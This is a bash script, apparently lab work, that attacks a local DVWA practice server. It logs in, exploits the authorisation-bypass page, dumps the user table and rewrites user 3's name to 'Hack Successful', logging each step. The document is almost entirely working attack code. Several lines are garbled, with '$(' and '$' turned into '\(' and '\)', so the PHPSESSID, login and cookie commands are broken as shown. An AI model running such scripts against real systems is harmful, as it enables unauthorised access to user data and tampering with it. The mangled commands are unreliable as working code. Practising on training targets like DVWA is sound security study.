#!/bin/bash

SECURITY="[Enter security level here, i.e. low, medium, high, or impossible]"
USER="[Enter username here, e.g. admin or gordonb]"
PASS="[Enter password here, e.g. password or abc123]"

rm cookies.txt #removes old file with cookies

#saves login cookies and login page html to local files
curl -s -c cookies.txt \
-b "security=$SECURITY" \
http://192.168.56.105/DVWA/login.php \
>login.html

TOKEN=$(grep -oP "name='user_token' value='\K[^']+" login.html) #saves user token variable found in login html
PHPSESSID=\((awk '\)6=="PHPSESSID"{print $7}' cookies.txt) #saves PHP session ID found in cookies

#logs in using cookies and user token
curl -s -b cookies.txt \
-b "security=$SECURITY" \
-d "username=\(USER&password=\)PASS&user_token=$TOKEN&Login=Login" \
http://192.168.56.105/DVWA/login.php



#attempts to access authorisation bypass page
HTML=$(curl -s -X GET \
-b "PHPSESSID=\(PHPSESSID; security=\)SECURITY" \
http://192.168.56.105/DVWA/vulnerabilities/authbypass/)

{
echo "[$(date)] Testing Authorisation Bypass"
echo "User: $USER"
echo "Security level: $SECURITY"
echo "Endpoint: /DVWA/vulnerabilities/authbypass/"
echo ""

if echo "$HTML" | grep -q "Welcome to the user manager"; then
    echo "Result: ACCESS GRANTED (Potential Authorisation Bypass)"
    echo ""
    echo "Evidence:"
    echo "$HTML" | grep "Welcome to the user manager" | sed 's/^[[:space:]]*//'
else
    echo "Result: ACCESS DENIED"
    echo "Admin functionality not accessible"
fi
#if echo "$HTML" | grep -q "Unauthorised"; then
#    echo "Result: ACCESS DENIED"
#    echo "Message: Unauthorised"
#else
#    echo "Result: ACCESS GRANTED (Potential Authorisation Bypass)"
#    echo ""
#    echo "Evidence:"
#    echo "$HTML" | grep "Welcome to the user manager" | sed 's/^[[:space:]]*//'
#fi

}> /home/kali/auth_bypass.log 2>&1



#attempts to retrieve user data
RESPONSE=$(curl -s -X GET \
-b "PHPSESSID=\(PHPSESSID; security=\)SECURITY" \
http://192.168.56.105/DVWA/vulnerabilities/authbypass/get_user_data.php)

{
echo "[$(date)] Attempting to retrieve user data"
echo "User: $USER"
echo "Security level: $SECURITY"
echo "Endpoint: /DVWA/vulnerabilities/authbypass/get_user_data.php"
echo ""

if echo "$RESPONSE" | jq -e '.result=="fail"' >/dev/null 2>&1; then
    echo "Result: \((echo "\)RESPONSE" | jq -r '.error')"
else
    echo "Result: ACCESS GRANTED"
    echo ""
    echo "User Table:"
    echo "$RESPONSE" | jq -r '.[] | "\(.user_id)\t\(.first_name)\t\(.surname)"' | column -t
fi

} > /home/kali/user_data.log 2>&1



#attempts to change the surname of user 3
{
echo "[$(date)] Attempting to modify user 3..."
echo "User: $USER"
echo "Security level: $SECURITY"
echo "Endpoint: /DVWA/vulnerabilities/authbypass/change_user_details.php"
echo ""
curl -s -X POST \
-b "PHPSESSID=\(PHPSESSID; security=\)SECURITY" \
-H "Content-Type: application/json" \
-d '{"id":3,"first_name":"Hack","surname":"Successful"}' \
http://192.168.56.105/DVWA/vulnerabilities/authbypass/change_user_details.php \
| jq -r '"Result: " + .result'
} > /home/kali/change_user.log 2>&1
